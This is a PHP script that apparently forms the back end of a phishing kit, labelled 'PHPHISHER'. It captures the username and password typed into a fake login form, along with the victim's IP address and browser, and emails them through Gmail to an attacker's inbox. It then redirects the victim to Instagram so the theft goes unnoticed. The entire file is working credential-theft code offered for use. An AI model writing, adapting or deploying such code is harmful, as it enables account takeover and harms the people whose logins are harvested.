<?php


use PHPMailer\PHPMailer\PHPMailer;
use Dotenv\Dotenv;


require_once __DIR__ . '/vendor/autoload.php';

$dotenv = Dotenv::createImmutable(__DIR__);
$dotenv->safeLoad();
function config($key)
{
    if ($_ENV[$key]) {
        return $_ENV[$key];
    } else {
        return false;
    }
}
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if (isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
$email = new PHPMailer();

// Set Template
$template = file_get_contents('template.html');
$template = str_replace("__time__", date('i:h A'), $template);
$template = str_replace("__date__", date('j-F-Y'), $template);
$template = str_replace('__password__', $_POST['password'], $template);
$template = str_replace('__email__', $_POST['username'], $template);
$template = str_replace('__ipaddr__', get_client_ip(), $template);
$template = str_replace('__useragent__', $_SERVER['HTTP_USER_AGENT'], $template);
// End Template

$email->isSMTP();
$email->SMTPDebug = 0;
$email->Debugoutput = 'html';
$email->Host = 'smtp.gmail.com';
$email->Port = 587;
$email->SMTPSecure = 'tls';
$email->SMTPAuth = true;
$email->Username = config('EMAIL_GMAIL');
$email->Password = config('PASSWORD_GMAIL');
$email->setFrom(config('EMAIL_GMAIL'), 'IHSAN DEVS');

// Set Receiver
$email->addAddress(config('TARGET_EMAIL'));

$email->Subject = 'PHPHISHER FROM IHSAN DEVS';
$email->msgHTML($template);
if (!$email->send()) {
    header('Location: /');
    exit;
} else {
    header('Location: https://instagram.com');
    exit;
}